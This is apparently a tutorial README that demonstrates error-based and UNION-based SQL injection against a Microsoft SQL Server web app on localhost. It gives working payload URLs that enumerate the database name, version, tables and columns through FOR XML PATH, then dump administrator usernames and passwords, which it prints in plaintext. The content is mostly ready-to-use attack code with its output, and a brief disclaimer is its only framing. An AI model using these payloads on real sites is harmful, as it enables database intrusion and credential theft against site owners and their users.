# MSSQL-Injection

Now let's get started the ERROR BASED INJECTION on MSSQL server, MSSQL it's Microsoft SQL Server in this post i will use error based injection with malicious interogation for manipulation database and extract administrator credentials. I will use a vulnerable aspx app in localhost for this example. I do not support these illegal activities !
```sql
 http://localhost/Product.aspx?Id=13 and 1=db_name()--
```

Using this simple query we will see the name of the database.

![Screenshot from 2024-01-25 10-31-38](https://github.com/LinuxDestroy/XML-PATH-Injector/assets/26278128/d42f8d12-0fd2-41e6-a6db-3c795ab06f89)

Now the database name is "chemtraders" 
Next step i want to see the DB and OS version for this i will use this query:

```sql
http://localhost/Product.aspx?Id=13 and @@version=1--
```

and output is:

![Screenshot from 2024-01-25 10-34-56](https://github.com/LinuxDestroy/XML-PATH-Injector/assets/26278128/94adade4-c58f-49d4-99df-0dcf67fe0c66)

We see "Microsoft SQL Server 2012 ( SP1 )"

Now let's get extract Tables name and Columns from DB with one query:
```sql
http://localhost/Product.aspx?Id=13 and 1=(select+table_name%2b'::'%2bcolumn_name as t+from+information_schema.columns FOR XML PATH(''))--
```
and output is:

![Screenshot from 2024-01-25 10-54-54](https://github.com/LinuxDestroy/XML-PATH-Injector/assets/26278128/3fb8189d-d4c9-4e23-b7b4-f692acc6eb26)

Ok now are interested:

AdminLogin ( Table )
UserName ( Column )
Password ( Column )

Let's get dump from this Columns ( UserName and Password ):
```sql
http://localhost/Product.aspx?Id=13 and 1=(select+Password,username+from+AdminLogin FOR XML PATH(''))--
```
Output is:

![Screenshot from 2024-01-25 11-01-25](https://github.com/LinuxDestroy/XML-PATH-Injector/assets/26278128/7704a537-2f76-4bcf-a1e1-886dd15186d4)

```plaintext
Username: admcheter
Password: bweb@chem#123$tre ( this is plaintext )
```

This query it's in Error Based but it is possible and with Union Select

Let's see how we do this

```sql
http://localhost/Category-Product.aspx?id=-6' union select 1,(select table_name%2b'::'%2bcolumn_name as t from information_schema.columns FOR XML PATH('')),3-- -
```

![Screenshot from 2024-01-25 11-11-32](https://github.com/LinuxDestroy/XML-PATH-Injector/assets/26278128/41178b9a-951e-4bee-b8e4-dace0a350e9b)

Now we see UserInfo, username and Password.

For this situation i want to extract Administration credential form this columns
```sql
http://localhost/Category-Product.aspx?id=-6&' union select 1,(select User_Name,Password from UserInfo FOR XML PATH('')),3-- -
```
![Screenshot from 2024-01-25 11-16-25](https://github.com/LinuxDestroy/XML-PATH-Injector/assets/26278128/abf6e991-823d-42c7-a440-4c6b81441939)
```plaintext
Username: Admin
Password: simplifi@123 ( plaintext )
```
We are done for tested my MsSQL db.







